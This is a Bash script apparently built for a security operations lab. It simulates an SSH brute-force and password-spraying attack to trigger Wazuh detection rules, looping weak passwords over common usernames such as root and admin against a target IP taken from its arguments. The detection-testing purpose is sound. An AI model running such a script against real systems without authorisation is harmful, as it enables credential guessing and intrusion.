#!/bin/bash
# ==============================================================================
# Script: attack-ssh-bruteforce.sh
# Description: Simulates an SSH password spraying / brute-force attack
# Language: Pure Bash / Netcat / SSH (Zero Python)
# Triggers: Wazuh Rule 5710, 5712, and Custom Rule 100002 (MITRE T1110)
# ==============================================================================

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-22}"

echo "[*] ==================================================="
echo "[*] SOC LAB ATTACK SIMULATION: SSH Brute Force"
echo "[*] Target: $TARGET_IP:$TARGET_PORT"
echo "[*] MITRE ATT&CK: T1110 (Brute Force)"
echo "[*] ==================================================="

# Test if SSH port is reachable
if ! nc -z -w 2 "$TARGET_IP" "$TARGET_PORT" 2>/dev/null; then
  echo "[-] Warning: SSH port $TARGET_PORT on $TARGET_IP is not responding. Ensure ssh service is active ('sudo systemctl start ssh')."
fi

FAKE_USERS=("admin" "root" "support" "guest" "testuser" "backup" "operator" "sysadmin")
PASSWORDS=("Password123" "123456" "toor" "admin2024" "letmein" "welcome1")

echo "[*] Launching simulated failed authentication attempts..."

for user in "${FAKE_USERS[@]}"; do
  for pass in "${PASSWORDS[@]:0:2}"; do
    echo "[!] Attempting logon: user='$user' with pass='$pass' on $TARGET_IP..."
    
    # sshpass if available, or direct ssh connection with invalid credentials
    if command -v sshpass &> /dev/null; then
      sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -p "$TARGET_PORT" "$user@$TARGET_IP" "exit" 2>/dev/null || true
    else
      # Fallback to direct ssh batch mode or ssh connection attempt
      ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o PreferredAuthentications=password -o PubkeyAuthentication=no -p "$TARGET_PORT" "$user@$TARGET_IP" 2>/dev/null || true
    fi
    sleep 0.5
  done
done

echo ""
echo "[+] Attack simulation completed."
echo "[+] Check Wazuh Dashboard:"
echo "    - Filter: 'rule.id: 5710' (SSH attempt with invalid user)"
echo "    - Filter: 'rule.id: 5712' (SSHD brute force)"
echo "    - Filter: 'rule.id: 100002' (SOC Lab Custom SSH Brute Force Rule)"
